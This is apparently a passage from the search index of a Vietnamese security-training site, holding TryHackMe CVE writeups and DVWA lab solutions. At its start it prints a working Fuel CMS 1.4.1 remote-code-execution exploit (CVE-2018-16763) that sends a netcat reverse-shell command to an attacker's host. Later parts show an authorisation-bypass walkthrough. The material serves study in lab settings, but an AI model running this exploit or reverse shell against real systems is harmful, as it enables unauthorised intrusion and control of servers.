BRIGHT + Fore . YELLOW + \"Enter Command $\" + Style . RESET_ALL ) main_url = url + \"/fuel/pages/select/?filter= %27% 2b %70% 69 %28% 70 %72% 69 %6e%74% 28 %24% 61 %3d%27% 73 %79% 73 %74% 65 %6d%27% 29 %29% 2b %24% 61 %28% 27\" + quote ( cmd ) + \" %27% 29%2b%27\" r = requests . get ( main_url ) #<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\"> output = r . text . split ( '<div style=\"border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;\">' ) print ( output [ 0 ]) if cmd == \"exit\" : break Ta th\u1ea5y source code tr\u00ean m\u00f4 t\u1ea3 vi\u1ec7c l\u1ea5y 1 gi\u00e1 tr\u1ecb l\u1ec7nh t\u1eeb attacker (bi\u1ebfn cmd \u1edf d\u00f2ng 52) v\u00e0 truy\u1ec1n v\u00e0o \u0111o\u1ea1n url \u0111\u1ec3 attack, c\u00f4ng \u0111o\u1ea1n ti\u1ebfp theo l\u00e0 \u0111o\u1ea1n output d\u1eef li\u1ec7u t\u1eeb h\u1ec7 th\u1ed1ng. V\u1eady t\u1eeb flow n\u00e0y th\u00ec ta s\u1ebd l\u00e0m g\u00ec ti\u1ebfp theo? N\u1ebfu ta c\u00f3 th\u1ec3 xem \u0111\u01b0\u1ee3c file /etc/shadow th\u00ec c\u00e2u chuy\u1ec7n c\u00f3 th\u1ec3 k\u1ebft th\u00fac t\u1ea1i \u0111\u00e2y. Nh\u01b0ng n\u1ebfu kh\u00f4ng xem \u0111\u01b0\u1ee3c th\u00ec sao? M\u1ed9t \u00fd t\u01b0\u1edfng m\u1edbi ta c\u00f3 th\u1ec3 t\u1ea1o reverse shell b\u1eb1ng Netcat OpenBsd v\u00e0 sau \u0111\u00f3 d\u00f9ng python -c import pty;pty.spawn (\"/bin/bash\") (n\u1ebfu c\u00f3 th\u1ec3) \u0111\u1ec3 v\u00e0o terminal c\u1ee7a m\u00e1y n\u1ea1n nh\u00e2n. Ro\u00e0i, d\u1ef1a v\u00e0o \u00fd t\u01b0\u1edfng tr\u00ean, ta s\u1ebd c\u1ea3i ti\u1ebfn \u0111o\u1ea1n code khai th\u00e1c tr\u00ean th\u00e0nh # Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1) Updated # Date 2021-08-16 # Exploit Author: jtaubs1 (ice-wzl) # Vendor Homepage: https://www.getfuelcms.com/ # Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1 # Version: <= 1.4.1 # Tested on: Ubuntu - Apache2 - php5 # CVE : CVE-2018-16763 # Update included: Works with python3 # Removed burp proxy code to allow it to run as a stand alone RCE exploit. # Takes sys.args # Spawns a Reverse shell #!/usr/bin/python3 import requests import urllib.parse import sys url_victim_machine = sys . argv [ 1 ] attacker_ip = sys . argv [ 2 ] attacker_port = sys . argv [ 3 ] command = \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc \" command += attacker_ip command += \" \" command += attacker_port command += \">/tmp/f\" payload = url_victim_machine + \"/fuel/pages/select/?filter= %27% 2b %70% 69 %28% 70 %72% 69 %6e%74% 28 %24% 61 %3d%27% 73 %79% 73 %74% 65 %6d%27% 29 %29% 2b %24% 61 %28% 27\" + urllib . parse . quote ( command ) + \" %27% 29%2b%27\" r = requests . get ( payload ) print ( r ) \u0110o\u1ea1n code tr\u00ean c\u00f3 \u01b0u \u0111i\u1ec3m l\u00e0 n\u00f3 s\u1ebd th\u1ef1c hi\u1ec7n lu\u00f4n c\u00f4ng vi\u1ec7c t\u1ea1o 1 revershell t\u1eeb m\u00e1y n\u1ea1n nh\u00e2n \u0111\u1ebfn m\u00e1y ch\u00fang ta th\u00f4ng qua l\u1ed7 h\u1ed5ng.","title":"T\u1ed5ng quan"},{"location":"cve/CVE-2018-16763/#challenge","text":"TryHackMe | Ignite Writeup","title":"Challenge"},{"location":"cve/CVE-2019-8942/","text":"CVE-2019-8942 \u00b6 https://www.exploit-db.com/exploits/49512 T\u1ed5ng quan \u00b6 Challenge \u00b6 TryHackMe | Blog Writeup","title":"CVE-2019-8942"},{"location":"cve/CVE-2019-8942/#cve-2019-8942","text":"https://www.exploit-db.com/exploits/49512","title":"CVE-2019-8942"},{"location":"cve/CVE-2019-8942/#tong-quan","text":"","title":"T\u1ed5ng quan"},{"location":"cve/CVE-2019-8942/#challenge","text":"TryHackMe | Blog Writeup","title":"Challenge"},{"location":"cve/CVE-2019-9053/","text":"CVE-2019-9053 \u00b6 https://www.exploit-db.com/search?cve=2019-9053 T\u1ed5ng quan \u00b6 Challenge \u00b6 TryHackMe | Simple CTF Writeup","title":"CVE-2019-9053"},{"location":"cve/CVE-2019-9053/#cve-2019-9053","text":"https://www.exploit-db.com/search?cve=2019-9053","title":"CVE-2019-9053"},{"location":"cve/CVE-2019-9053/#tong-quan","text":"","title":"T\u1ed5ng quan"},{"location":"cve/CVE-2019-9053/#challenge","text":"TryHackMe | Simple CTF Writeup","title":"Challenge"},{"location":"dvwa/","text":"DVWA \u00b6 Welcome to Damn Vulnerable Web Application! \u00b6 Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment. The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface. General Instructions \u00b6 It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability. Please note, there are both documented and undocumented vulnerability with this software. This is intentional. You are encouraged to try and discover as many issues as possible. There is a help button at the bottom of each page, which allows you to view hints & tips for that vulnerability. There are also additional links for further background reading, which relates to that security issue. WARNING! \u00b6 Damn Vulnerable Web Application is damn vulnerable! Do not upload it to your hosting provider's public html folder or any Internet facing servers, as they will be compromised. It is recommend using a virtual machine (such as VirtualBox or VMware), which is set to NAT networking mode. Inside a guest machine, you can download and install XAMPP for the web server and database. Disclaimer \u00b6 We do not take responsibility for the way in which any one uses this application (DVWA). We have made the purposes of the application clear and it should not be used maliciously. We have given warnings and taken measures to prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation of DVWA it is not our responsibility it is the responsibility of the person/s who uploaded and installed it. More Training Resources \u00b6 DVWA aims to cover the most commonly seen vulnerabilities found in today's web applications. However there are plenty of other issues with web applications. Should you wish to explore any additional attack vectors, or want more difficult challenges, you may wish to look into the following other projects: Mutillidae OWASP Vulnerable Web Applications Directory List of Modules \u00b6 In this section, I will present my solution to the modules in DVWA at each level Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Authorisation Bypass Open HTTP Redirect","title":"DVWA"},{"location":"dvwa/#dvwa","text":"","title":"DVWA"},{"location":"dvwa/#welcome-to-damn-vulnerable-web-application","text":"Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment. The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface.","title":"Welcome to Damn Vulnerable Web Application!"},{"location":"dvwa/#general-instructions","text":"It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability. Please note, there are both documented and undocumented vulnerability with this software. This is intentional. You are encouraged to try and discover as many issues as possible. There is a help button at the bottom of each page, which allows you to view hints & tips for that vulnerability. There are also additional links for further background reading, which relates to that security issue.","title":"General Instructions"},{"location":"dvwa/#warning","text":"Damn Vulnerable Web Application is damn vulnerable! Do not upload it to your hosting provider's public html folder or any Internet facing servers, as they will be compromised. It is recommend using a virtual machine (such as VirtualBox or VMware), which is set to NAT networking mode. Inside a guest machine, you can download and install XAMPP for the web server and database.","title":"WARNING!"},{"location":"dvwa/#disclaimer","text":"We do not take responsibility for the way in which any one uses this application (DVWA). We have made the purposes of the application clear and it should not be used maliciously. We have given warnings and taken measures to prevent users from installing DVWA on to live web servers. If your web server is compromised via an installation of DVWA it is not our responsibility it is the responsibility of the person/s who uploaded and installed it.","title":"Disclaimer"},{"location":"dvwa/#more-training-resources","text":"DVWA aims to cover the most commonly seen vulnerabilities found in today's web applications. However there are plenty of other issues with web applications. Should you wish to explore any additional attack vectors, or want more difficult challenges, you may wish to look into the following other projects: Mutillidae OWASP Vulnerable Web Applications Directory","title":"More Training Resources"},{"location":"dvwa/#list-of-modules","text":"In this section, I will present my solution to the modules in DVWA at each level Brute Force Command Injection CSRF File Inclusion File Upload Insecure CAPCHA SQL Injection SQL Injection (Blind) Weak Session IDs XSS (DOM) XSS (Reflected) XSS (Stored) CSP Bypass JavaScript Authorisation Bypass Open HTTP Redirect","title":"List of Modules"},{"location":"dvwa/template/","tags":["DVWA","Authorisation Bypass"],"text":"Authorisation Bypass \u00b6 Objective \u00b6 Your goal is to get the administrator\u2019s password by brute forcing. Bonus points for getting the other four user passwords! Security Level: Low \u00b6 Source code vulnerabilities/brute/source/impossible.php <?php if ( isset ( $_POST [ 'Login' ] ) && isset ( $_POST [ 'username' ]) && isset ( $_POST [ 'password' ]) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST [ 'username' ]; $user = stripslashes ( $user ); $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_POST [ 'password' ]; $pass = stripslashes ( $pass ); $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Default values $total_failed_login = 3 ; $lockout_time = 15 ; $account_locked = false ; // Check the database (Check user information) $data = $db -> prepare ( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // Check to see if the user has been locked out. if ( ( $data -> rowCount () == 1 ) && ( $row [ 'failed_login' ] >= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo \"<pre><br />This account has been locked due to too many incorrect logins.</pre>\"; // Calculate when the user would be allowed to login again $last_login = strtotime ( $row [ 'last_login' ] ); $timeout = $last_login + ( $lockout_time * 60 ); $timenow = time (); /* print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"<br />\"; print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"<br />\"; print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"<br />\"; */ // Check to see if enough time has passed, if it hasn't locked the account if ( $timenow < $timeout ) { $account_locked = true ; // print \"The account is locked<br />\"; } } // Check the database (if username matches the password) $data = $db -> prepare ( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> bindParam ( ':password' , $pass , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // If its a valid login... if ( ( $data -> rowCount () == 1 ) && ( $account_locked == false ) ) { // Get users details $avatar = $row [ 'avatar' ]; $failed_login = $row [ 'failed_login' ]; $last_login = $row [ 'last_login' ]; // Login successful echo \"<p>Welcome to the password protected area <em> { $user } </em></p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; // Had the account been locked out since last login? if ( $failed_login >= $total_failed_login ) { echo \"<p><em>Warning</em>: Someone might of been brute forcing your account.</p>\" ; echo \"<p>Number of login attempts: <em> { $failed_login } </em>.<br />Last login attempt was at: <em> { $last_login } </em>.</p>\" ; } // Reset bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } else { // Login failed sleep ( rand ( 2 , 4 ) ); // Give the user some feedback echo \"<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in { $lockout_time } minutes</em>.</pre>\" ; // Update bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Set the last login time $data = $db -> prepare ( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 Exploition \u00b6 Security Level: Medium \u00b6 Source code Analysis \u00b6 Exploition \u00b6 Security Level: High \u00b6 Source code Analysis \u00b6 Security Level: Impossible \u00b6 Source code Analysis \u00b6 What we learned \u00b6 More Information \u00b6","title":"Authorisation Bypass"},{"location":"dvwa/template/#authorisation-bypass","text":"","title":"Authorisation Bypass"},{"location":"dvwa/template/#objective","text":"Your goal is to get the administrator\u2019s password by brute forcing. Bonus points for getting the other four user passwords!","title":"Objective"},{"location":"dvwa/template/#security-level-low","text":"Source code vulnerabilities/brute/source/impossible.php <?php if ( isset ( $_POST [ 'Login' ] ) && isset ( $_POST [ 'username' ]) && isset ( $_POST [ 'password' ]) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST [ 'username' ]; $user = stripslashes ( $user ); $user = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $user ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitise password input $pass = $_POST [ 'password' ]; $pass = stripslashes ( $pass ); $pass = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $pass ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $pass = md5 ( $pass ); // Default values $total_failed_login = 3 ; $lockout_time = 15 ; $account_locked = false ; // Check the database (Check user information) $data = $db -> prepare ( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // Check to see if the user has been locked out. if ( ( $data -> rowCount () == 1 ) && ( $row [ 'failed_login' ] >= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo \"<pre><br />This account has been locked due to too many incorrect logins.</pre>\"; // Calculate when the user would be allowed to login again $last_login = strtotime ( $row [ 'last_login' ] ); $timeout = $last_login + ( $lockout_time * 60 ); $timenow = time (); /* print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"<br />\"; print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"<br />\"; print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"<br />\"; */ // Check to see if enough time has passed, if it hasn't locked the account if ( $timenow < $timeout ) { $account_locked = true ; // print \"The account is locked<br />\"; } } // Check the database (if username matches the password) $data = $db -> prepare ( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> bindParam ( ':password' , $pass , PDO :: PARAM_STR ); $data -> execute (); $row = $data -> fetch (); // If its a valid login... if ( ( $data -> rowCount () == 1 ) && ( $account_locked == false ) ) { // Get users details $avatar = $row [ 'avatar' ]; $failed_login = $row [ 'failed_login' ]; $last_login = $row [ 'last_login' ]; // Login successful echo \"<p>Welcome to the password protected area <em> { $user } </em></p>\" ; echo \"<img src= \\\" { $avatar } \\\" />\" ; // Had the account been locked out since last login? if ( $failed_login >= $total_failed_login ) { echo \"<p><em>Warning</em>: Someone might of been brute forcing your account.</p>\" ; echo \"<p>Number of login attempts: <em> { $failed_login } </em>.<br />Last login attempt was at: <em> { $last_login } </em>.</p>\" ; } // Reset bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = \"0\" WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } else { // Login failed sleep ( rand ( 2 , 4 ) ); // Give the user some feedback echo \"<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in { $lockout_time } minutes</em>.</pre>\" ; // Update bad login count $data = $db -> prepare ( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Set the last login time $data = $db -> prepare ( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data -> bindParam ( ':user' , $user , PDO :: PARAM_STR ); $data -> execute (); } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Low"},{"location":"dvwa/template/#analysis","text":"","title":"Analysis"},{"location":"dvwa/template/#exploition","text":"","title":"Exploition"},{"location":"dvwa/template/#security-level-medium","text":"Source code","title":"Security Level: Medium"},{"location":"dvwa/template/#analysis_1","text":"","title":"Analysis"},{"location":"dvwa/template/#exploition_1","text":"","title":"Exploition"},{"location":"dvwa/template/#security-level-high","text":"Source code","title":"Security Level: High"},{"location":"dvwa/template/#analysis_2","text":"","title":"Analysis"},{"location":"dvwa/template/#security-level-impossible","text":"Source code","title":"Security Level: Impossible"},{"location":"dvwa/template/#analysis_3","text":"","title":"Analysis"},{"location":"dvwa/template/#what-we-learned","text":"","title":"What we learned"},{"location":"dvwa/template/#more-information","text":"","title":"More Information"},{"location":"dvwa/authorisation-bypass/","tags":["DVWA","Authorisation Bypass"],"text":"Authorisation Bypass \u00b6 About \u00b6 When developers have to build authorisation matrices into complex systems it is easy for them to miss adding the right checks in every place, especially those which are not directly accessible through a browser, for example API calls. As a tester, you need to be looking at every call a system makes and then testing it using every level of user to ensure that the checks are being carried out correctly. This can often be a long and boring task, especially with a large matrix with lots of different user types, but it is critical that the testing is carried out as one missed check could lead to an attacker gaining access to confidential data or functions. Objective \u00b6 Your goal is to test this user management system at all four security levels to identify any areas where authorisation checks have been missed. The system is only designed to be accessed by the admin user, so have a look at all the calls made while logged in as the admin, and then try to reproduce them while logged in as different user. If you need a second user, you can use gordonb/abc123. Security Level: Low \u00b6 Source code vulnerabilities/authbypass/source/low.php <?php /* Nothing to see here for this vulnerability, have a look instead at the dvwaHtmlEcho function in: * dvwa/includes/dvwaPage.inc.php */ ?> Analysis \u00b6 Khi v\u00e0o challenge n\u00e0y, ta \u0111\u01b0\u1ee3c th\u00f4ng b\u00e1o nh\u01b0 h\u00ecnh d\u01b0\u1edbi \u0110i\u1ec1u \u0111\u00f3 c\u00f3 ngh\u0129a l\u00e0, ta c\u1ea7n ph\u1ea3i logout user admin v\u00e0 login 1 user kh\u00e1c: D\u00f9ng SQLi v\u00e0 John The Ripper \u0111\u1ec3 t\u00ecm password c\u1ee7a c\u00e1c user kh\u00e1c Login b\u1eb1ng user trong th\u00f4ng b\u00e1o gordonb/abc123 Sau khi login b\u1eb1ng user gordonb, ta kh\u00f4ng h\u1ec1 th\u1ea5y m\u1ee5c Authorisation Bypass n\u1eefa C\u00f9ng xem l\u1ea1i danh s\u00e1ch challenge xu\u1ea5t hi\u1ec7n trong vai tr\u00f2 admin trong h\u00ecnh b\u00ean d\u01b0\u1edbi Full challenge \u0110\u1ec3 \u00fd r\u1eb1ng, url c\u1ee7a challenge l\u00e0 http://localhost:4280/vulnerabilities/authbypass/ v\u00e0 trong c\u1ea5p \u0111\u1ed9 n\u00e0y, kh\u00f4ng h\u1ec1 c\u00f3 ki\u1ec3m tra \u0111\u1ea7u v\u00e0o c\u0169ng nh\u01b0 ki\u1ec3m tra ng\u01b0\u1eddi d\u00f9ng, n\u00ean ta d\u1ec5 d\u00e0ng truy c\u1eadp \u0111\u01b0\u1ee3c tr\u1ef1c ti\u1ebfp trang Authorisation Bypass v\u1edbi user gordonb Authorisation bypass \u0111\u01b0\u1ee3c hi\u1ec3u \u0111\u01a1n gi\u1ea3n l\u00e0 d\u00f9ng m\u1ed9t v\u00e0i \"th\u1ee7 thu\u1eadt\" \u0111\u1ec3 truy c\u1eadp nh\u1eefng t\u00e0i nguy\u00ean m\u00e0 n\u1ed9i t\u1ea1i user \u0111\u00f3 kh\u00f4ng c\u00f3 quy\u1ec1n truy c\u1eadp t\u1edbi. \"Th\u1ee7 thu\u1eadt\" n\u00e0y c\u00f3 \u0111\u01b0\u1ee3c l\u00e0 nh\u1edd v\u00e0o \u0111\u1ed9i tri\u1ec3n khai ch\u01b0a c\u00f3 nh\u1eefng chi\u1ebfc l\u01b0\u1ee3c ph\u00f2ng v\u1ec7 k\u0129 c\u00e0ng. Exploition \u00b6 Security Level: Medium \u00b6 Source code vulnerabilities/authbypass/source/medium.php <?php /* Only the admin user is allowed to access this page. Have a look at these two files for possible vulnerabilities: * vulnerabilities/authbypass/get_user_data.php * vulnerabilities/authbypass/change_user_details.php */ if ( dvwaCurrentUser () != \"admin\" ) { print \"Unauthorised\" ; http_response_code ( 403 ); exit ; } ?> Analysis \u00b6 Challenge n\u00e0y cung c\u1ea5p cho ta 2 API, 1 cho GET th\u00f4ng tin c\u00e1c user, 1 cho POST mang m\u1ee5c \u0111\u00edch \u0111\u1ed5i th\u00f4ng tin user: HTTP GET: localhost:4280/vulnerabilities/authbypass/get_user_data.php HTTP POST: http://localhost:4280/vulnerabilities/authbypass/change_user_details.php \u0110i\u1ec1u ng\u1ea1c nhi\u00ean h\u01a1n. M\u1eb7c d\u00f9 v\u1edbi user gordonb , ta kh\u00f4ng truy c\u1eadp \u0111\u01b0\u1ee3c v\u00e0o trang challenge nh\u01b0ng l\u1ea1i c\u00f3 th\u1ec3 truy c\u1eadp \u0111\u01b0\u1ee3c v\u00e0o 2 API [{ \"user_id\" : \"1\" , \"first_name\" : \"admin\" , \"surname\" : \"admin\" },{ \"user_id\" : \"2\" , \"first_name\" : \"Gordon\" , \"surname\" : \"Brown\" },{ \"user_id\" : \"3\" , \"first_name\" : \"Hack\" , \"surname\" : \"Me\" },{ \"user_id\" : \"4\" , \"first_name\" : \"Pablo\" , \"surname\" : \"Picasso\" },{ \"user_id\" : \"5\" , \"first_name\" : \"Bob\" , \"surname\" : \"Smith\" }] \u0110i\u1ec1u n\u00e0y c\u00f3 ngh\u0129a l\u00e0, ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng 2 API \u0111\u00f3 v\u00e0 c\u00f3 th\u1ec3 khai th\u00e1c \u0111\u01b0\u1ee3c g\u00ec \u0111\u00f3 t\u1eeb c\u00e1i API d\u00f9ng HTTP POST. Vi\u1ec7c n\u00e0y ch\u1ee9ng t\u1ecf ta \u0111\u00e3 authorisation bypass th\u00e0nh c\u00f4ng. Exploition \u00b6 Oke, tri\u1ec3n khai th\u00f4i n\u00e0o. \u0110\u1ea7u ti\u00ean l\u00e0 t\u1ea1o 1 form HTTP POST c\u01a1 b\u1ea3n nh\u1eb1m g\u1eedi request l\u00ean API http://localhost:4280/vulnerabilities/authbypass/change_user_details.php <!DOCTYPE html> < html > < head > < title > POST Data to Web Page </ title > </ head > < body > < h1 > Enter User Information </ h1 > < form action = \"http://localhost:4280/vulnerabilities/authbypass/change_user_details.php\" method = \"post\" > < label for = \"user_id\" > ID: </ label > < input type = \"text\" id = \"user_id\" name = \"user_id\" value = \"2\" >< br >< br > < label for = \"first_name\" > First Name: </ label > < input type = \"text\" id = \"first_name\" name = \"first_name\" value = \"admin\" >< br >< br > < label for = \"surname\" > Surname: </ label > < input type = \"text\" id = \"surname\" name = \"surname\" value = \"admin\" >< br >< br > < input type = \"submit\" value = \"Submit\" > </ form > </ body > </ html > Ta th\u1ea5y r\u1eb1ng user c\u00f3 user_id=1 ch\u00ednh l\u00e0 admin. Ta th\u1eed ch\u1ec9nh s\u1eeda t\u1ea1i n\u01a1i c\u00f3 user_id=2 th\u00e0nh \"first_name\":\"admin\",\"surname\":\"admin\" V\u00e0 \u0111i\u1ec1u ng\u1ea1c nhi\u00ean l\u00e0 ta ho\u00e0n to\u00e0n c\u00f3 th\u1ec3 ch\u1ec9nh s\u1eeda th\u00f4ng tin c\u00e1c user (xem h\u00ecnh d\u01b0\u1edbi), nh\u01b0ng ho\u00e0n to\u00e0n kh\u00f4ng v\u00e0o \u0111\u01b0\u1ee3c trang http://localhost:4280/vulnerabilities/authbypass/ Thay \u0111\u1ed5i th\u00f4ng tin user th\u00f4ng qua user gordonb Ho\u00e0n th\u00e0nh th\u1eed th\u00e1ch. Security Level: High \u00b6 Source code vulnerabilities/authbypass/source/high.php <?php /* Only the admin user is allowed to access this page. Have a look at this file for possible vulnerabilities: * vulnerabilities/authbypass/change_user_details.php */ if ( dvwaCurrentUser () != \"admin\" ) { print \"Unauthorised\" ; http_response_code ( 403 ); exit ; } ?> Analysis \u00b6 \u1ede c\u1ea5p \u0111\u1ed9 n\u00e0y, h\u1ecd ch\u1eb7n kh\u00f4ng cho ng\u01b0\u1eddi d\u00f9ng b\u00ecnh th\u01b0\u1eddng truy c\u1eadp v\u00e0o API d\u00f9ng HTTP GET nh\u01b0ng l\u1ea1i qu\u00ean ch\u1eb7n c\u00e1i POST, d\u1eabn \u0111\u1ebfn vi\u1ec7c ta v\u1eabn c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng thay \u0111\u1ed5i th\u00f4ng tin c\u00e1c user t\u1eeb user gordonb Security Level: Impossible \u00b6 Source code vulnerabilities/authbypass/source/impossible.php <?php /* Only the admin user is allowed to access this page */ if ( dvwaCurrentUser () != \"admin\" ) { print \"Unauthorised\" ; http_response_code ( 403 ); exit ; } ?> Analysis \u00b6 Hopefully on this level all the functions correctly check authorisation before allowing access to the data. There may however be some non-authorisation related issues on the page, so do not write it off as fully secure. More Information \u00b6 Reference: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema Reference: https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication","title":"Authorisation Bypass"},{"location":"dvwa/authorisation-bypass/#authorisation-bypass","text":"","title":"Authorisation Bypass"},{"location":"dvwa/authorisation-bypass/#about","text":"When developers have to build authorisation matrices into complex systems it is easy for them to miss adding the right checks in every place, especially those which are not directly accessible through a browser, for example API calls. As a tester, you need to be looking at every call a system makes and then testing it using every level of user to ensure that the checks are being carried out correctly. This can often be a long and boring task, especially with a large matrix with lots of different user types, but it is critical that the testing is carried out as one missed check could lead to an attacker gaining access to confidential data or functions.","title":"About"},{"location":"dvwa/authorisation-bypass/#objective","text":"Your goal is to test this user management system at all four security levels to identify any areas where authorisation checks have been missed. The system is only designed to be accessed by the admin user, so have a look at all the calls made while logged in as the admin, and then try to reproduce them while logged in as different user. If you need a second user, you can use gordonb/abc123.","title":"Objective"},{"location":"dvwa/authorisation-bypass/#security-level-low","text":"Source code vulnerabilities/authbypass/source/low.php <?php /* Nothing to see here for this vulnerability, have a look instead at the dvwaHtmlEcho function in: * dvwa/includes/dvwaPage.inc.php */ ?>","title":"Security Level: Low"},{"location":"dvwa/authorisation-bypass/#analysis","text":"Khi v\u00e0o challenge n\u00e0y, ta \u0111\u01b0\u1ee3c th\u00f4ng b\u00e1o nh\u01b0 h\u00ecnh d\u01b0\u1edbi \u0110i\u1ec1u \u0111\u00f3 c\u00f3 ngh\u0129a l\u00e0, ta c\u1ea7n ph\u1ea3i logout user admin v\u00e0 login 1 user kh\u00e1c: D\u00f9ng SQLi v\u00e0 John The Ripper \u0111\u1ec3 t\u00ecm password c\u1ee7a c\u00e1c user kh\u00e1c Login b\u1eb1ng user trong th\u00f4ng b\u00e1o gordonb/abc123 Sau khi login b\u1eb1ng user gordonb, ta kh\u00f4ng h\u1ec1 th\u1ea5y m\u1ee5c Authorisation Bypass n\u1eefa C\u00f9ng xem l\u1ea1i danh s\u00e1ch challenge xu\u1ea5t hi\u1ec7n trong vai tr\u00f2 admin trong h\u00ecnh b\u00ean d\u01b0\u1edbi Full challenge \u0110\u1ec3 \u00fd r\u1eb1ng, url c\u1ee7a challenge l\u00e0 http://localhost:4280/vulnerabilities/authbypass/ v\u00e0 trong c\u1ea5p \u0111\u1ed9 n\u00e0y, kh\u00f4ng h\u1ec1 c\u00f3 ki\u1ec3m tra \u0111\u1ea7u v\u00e0o c\u0169ng nh\u01b0 ki\u1ec3m tra ng\u01b0\u1eddi d\u00f9ng, n\u00ean ta d\u1ec5 